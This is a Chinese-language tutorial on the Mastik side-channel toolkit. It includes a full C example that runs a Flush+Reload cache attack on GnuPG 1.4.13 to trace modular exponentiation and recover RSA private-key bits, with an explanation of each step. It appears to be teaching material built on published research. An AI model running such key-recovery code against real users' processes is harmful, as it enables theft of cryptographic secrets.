# Mastik: A Micro-Architectural Side-Channel Toolkit[^1]

## Introduction

微体系结构的侧信道攻击利用处理器内部组件之间的争用泄露进程间信息。虽然理论的攻击原理很简单，但实际实现往往很挑剔，需要了解大量很少文档的处理器特性和其他特定领域的知识。这种技术壁垒阻碍了该领域的发展和现有软件针对此类攻击的抵抗性分析。

本文档介绍 Mastik，一个用于微体系结构侧信道攻击实验的工具包。Mastik 旨在提供已公开的攻击和分析技术的实现。目前的版本还是 0.02，在 x86 体系中实现了六种基于缓存的攻击，包括：

- L1d Prime+Probe
- L1i Prime+Probe
- LLC Prime+Probe
- Flush+Reload
- Flush+Flush
- Performance Degradation Attack

除了实施攻击之外，Mastik 还提供了帮助攻击的工具，包括处理符号代码引用，如加载符号名或调试信息，以及简化侧信道攻击中常用的系统特性的功能。0.02 版本的新一个特性是 `FR-trace`，它支持通过命令行部署一个 Flush+Reload 攻击。

## Mastik Examples

演示在 GnuPG 1.4.13 上复现 Flush+Reload 攻击。

GnuPG 1.4.13 使用快速幂（平方-乘）算法执行 RSA 解密和签名的模幂运算。Yarom[^2] 证明此种实现易受到 F+R 攻击。使用 F+R 跟踪受害者使用乘法、平方和取模操作的情况，攻击者可以恢复快速幂的指数位，即受害者私钥。

F+R 的核心原理很简单，但攻击实现需要以固定的时间间隔重复探测内存。当被操作系统中断时，它还应该能够与受害者重新同步。此外，攻击者需要能够与受害者重新同步。此外，攻击者还需要将源代码位置转换为内存地址。Mastik 完成了大部分操作，它隐藏了攻击的复杂性，为用户提供一个简单的发起攻击的接口。

攻击代码如下：

```c
#define SAMPLES 100000
#define SLOT	2000
#define THRESHOLD 100

char *monitor[] = {
  "mpih-mul.c:85",  // mul_n_basecase
  "mpih-mul.c:271", // mpih_sqr_n
  "mpih-div.c:356"  // mpihelp_divrem
};
int nmonitor = sizeof(monitor)/sizeof(monitor[0]);

void usage(const char *prog) {
  fprintf(stderr, "Usage: %s <gpg-binary>\n", prog);
  exit(1);
}


int main(int ac, char **av) {
  char *binary = av[1];
  if (binary == NULL)
    usage(av[0]);

  fr_t fr = fr_prepare();
  for (int i = 0; i < nmonitor; i++) {
    // 获取要监控的地址偏移
    uint64_t offset = sym_getsymboloffset(binary, monitor[i]);
    if (offset == ~0ULL) {
      fprintf(stderr, "Cannot find %s in %s\n", monitor[i], binary);
      exit(1);
    } 
    // printf("%x\n", offset);
    fr_monitor(fr, map_offset(binary, offset));
  }

  uint16_t *res = malloc(SAMPLES * nmonitor * sizeof(uint16_t));
  for (int i = 0; i < SAMPLES * nmonitor ; i+= 4096/sizeof(uint16_t))
    res[i] = 1;
  fr_probe(fr, res);

  int l = fr_trace(fr, SAMPLES, res, SLOT, THRESHOLD, 500);
  for (int i = 0; i < l; i++) {
    for (int j = 0; j < nmonitor; j++)
      printf("%d ", res[i * nmonitor + j]);
    putchar('\n');
  }

  free(res);
  fr_release(fr);
}
```

Mastik 使用 `fr_t` 结构体封装了 F+R 攻击。

首先设置攻击要监控的内存地址，监控受害者代码中计算乘法、平方和取模运算的位置。使用 `sym_getsymboloffset` 获取要监控的源代码行在 GnuPG 二进制文件中的偏移。然后使用 `map_offset` 将这些地址映射到攻击者的地址空间，使用 `fr_monitor` 将这些地址添加到 F+R 监控的地址列表。

攻击由 `fr_trace` 执行，它等待受监控的地址开始活动，然后以固定的时间间隔收集活动记录。当检测到足够长的不活动时间，或者函数申请的存储结果的空间耗尽时，停止收集。收集过程就是测量受监控地址读取所需时间，短时间则代表以缓存，处于活动状态。

最后，程序会输出结果，攻击者可以根据结果恢复受害者执行的操作序列，并推断出指数。





[^1]:Mastik: A Micro-Architectural Side-Channel Toolkit,https://cs.adelaide.edu.au/~yval/Mastik.
[^2]: Yuval Yarom and Katrina Falkner, FLUSH+RELOAD a High Resolution,Low Noise,L3 Cache Side-Channel Attack, USENIX 2014.

